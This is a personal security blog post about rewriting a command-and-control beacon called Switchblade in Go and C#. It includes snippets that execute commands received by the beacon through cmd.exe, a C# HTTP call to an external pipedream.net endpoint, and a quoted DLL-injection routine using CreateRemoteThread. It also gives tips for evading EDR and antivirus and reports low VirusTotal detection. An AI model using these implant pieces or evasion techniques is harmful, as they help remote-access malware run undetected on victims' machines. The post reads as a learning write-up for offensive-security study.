# Rewriting Beacons

As is evident from the title, I rewrote the Switchblade beacon in two new languages. That was Go and C#.
I had a few different motivations for doing so. The primary one was I felt like I reached the limits of Python. If I wanted to do anything more
I would need to import CTypes and at that point, why not just use C right? Additionally, with Go I could build the final beacon to be compatible for
any system as opposed to *just* an .exe for Windows or *just* a .py script for *Nix systems.
The final overarching reason for doing so was also just to learn more. C# is incredibly powerful as outlined in previous posts here and elsewhere.
You can unhook NTDLL, overwrite memory locations with what you think should go there, inject shellcode, and so on.

###Let's start with how it went with Go first.

Go was without a doubt far quicker to transition from Python to than C#. The syntax was very similar and libraries felt like they functioned 
much the same way. For instance, a GET request in Go would look like this:

```Go
client := http.Client{} // Make our web client structure
req, err := http.NewRequest("GET", "http://google.com", nil) // Define a new request
req.Header.Add("User-Agent", 'Im a super nifty header') // Add some cool new headers
resp, err := client.Do(req) // Send it off
```
And the same thing in Python:
```Python
headers = {
    'User-Agent': 'Im a super nifty header' # Set up a cool header
}
requests.get(f'http://google.com', headers=headers) # Send the request
```

Go requires you to do a little more setup than Python, but otherwise it's much the same. 

This can be seen again in the command execution function. First is how it's performed in Go:
```Go
cmd := exec.Command("cmd.exe", "/C", beacon_command) // exec.Command returns the Cmd struct to execute the named program with the given arguments.
result, _ := cmd.Output() // And then get the output, _ here is to grab any errors
hostname := []byte(result)
```
And again in Python:
```Python
command = ['cmd.exe', '/c', beacon_command] # Forming the layout of the command here
process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=False)
out, err = process.communicate()
hostname = out.decode()
```

A lot of time was spent on figuring out how commands should be executed. If it's too obvious that it's coming from a web request, the EDR will
flag it. I spent a while going back and forth on how this should be done. I wanted to execute the command under an entirely new process that wouldn't 
inherit any data from the parent process so as to avoid linking back.
![A parentless process](/assets/img/What-I-Learned/no%20parent%20process.png "A parentless process")

It's actually really neat how this functions though. If you include `creationflags=0x00000008`, then you get a fully independant 
process who's parent has died for all intents and purposes, but the beacon still persists. `close_fds` gets us half way there
by keeping the parent file descriptors from being copied to the subprocess.

But this had drawbacks. I couldn't get the command output on things like `dir` and that's a deal breaker.

In the end, the flag for detached processes was dropped in favor of more reliable command execution. 

The overall detection for the Go beacon was pretty low. No one on Antiscan picked it up: 
![Antiscan](/assets/img/What-I-Learned/antiscan-results.png)

And only 6 vendors picked it up on Virustotal:
![VT](/assets/img/What-I-Learned/virustotal-results.png)

These low detection rates can primarily be attributed to how Golang is compiled, though I was able to knock Microsoft off the detection list by first
assigning the retrieved command to a new variable as opposed to passing it directly to be executed. One other point on Go, typically beacons generated
from it are very hard for AV to detect. This is due to them statically linking all the necessary libraries needed for compiling, which bumps the file
size up past what some AV's can handle scanning. This isn't a new tactic either, the [Commie malware family padded 64MB of data](https://unit42.paloaltonetworks.com/unit42-comnie-continues-target-organizations-east-asia/) to their compiled executables in
order to avoid being scanned.

###Now how did it go with C#?

I originally wanted to use C++ for this actually, but encountered a number of issues that C# had already resolved.
The crux of the Switchblade communication design is GET and POST web requests and, surprisingly, C++ does not have an easy native
way to perform these. You have to import another library in order to do this. So not a big deal, go to GitHub, grab one, import it. Ah but the one 
you grabbed doesn't compile with the latest version of Visual Studio you have, so should you troubleshoot the compatability issue or use the 2019
version over the 2022 version? I'm sure more experienced developers more familiar with C++ are shouting at this with an easy solution, but in that moment
it was just very confusing to figure out. 

Using C# though was much easier comparitively. What took essentially one line in Python, took a few more in C#, but the end result was a very stable HTTP structure.
And this was all with builtin structures, no downloading 3rd party libraries from Github and installing them yourself and troubleshooting what version of VS they were
made for, it just worked.

```C#
using (client)
            {
                client.BaseAddress = new Uri("https://eoqqzdfuzmgq7gg.m.pipedream.net/");
                HttpResponseMessage response = client.GetAsync("").Result;
                response.EnsureSuccessStatusCode();
                string result = response.Content.ReadAsStringAsync().Result;
                Console.WriteLine("Result: " + result);
            }
```

Pretty nifty right? 

The original goal with using C++ was also to be able to do a bunch of advanced memory things, like injecting shellcode into running processes.
C#, by nature of being a C based language, has all these tools to do memory modification that you would expect with C++! You still have
things like CreateRemoteThread, WriteProcessMemory, and LoadLlibraryA.

For example, look at the [following code taken from here](https://codingvision.net/c-inject-a-dll-into-a-process-w-createremotethread):
```C#
public static int Main()
    {
        // the target process - I'm using a dummy process for this
        // if you don't have one, open Task Manager and choose wisely
        Process targetProcess = Process.GetProcessesByName("testApp")[0];

        // geting the handle of the process - with required privileges
        IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

        // searching for the address of LoadLibraryA and storing it in a pointer
        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

        // name of the dll we want to inject
        string dllName = "test.dll";

        // alocating some memory on the target process - enough to store the name of the dll
        // and storing its address in a pointer
        IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        // writing the name of the dll there
        UIntPtr bytesWritten;
        WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

        // creating a thread that will call LoadLibraryA with allocMemAddress as argument
        CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);

        return 0;
    }
```

This reads strikingly similar to C++ functions designed to do the same thing. The point being that by using C# instead of C++, I have sacrificed
very little and gained quite a bit.

Go was evidently easier to transition to, but C# definitely had more to teach me. Go was very forgiving with how the program coud be laid out
while with C#, if you got the function declaration wrong, nothing would work. C# was also very interesting from a compilation standpoint. The
program could be compiled down to a DLL or executable without issue, and this opens up even more avenues of exploitation. The detection rate
for each file was also increadibly low:
![CSVT](/assets/img/What-I-Learned/cs-exe.png)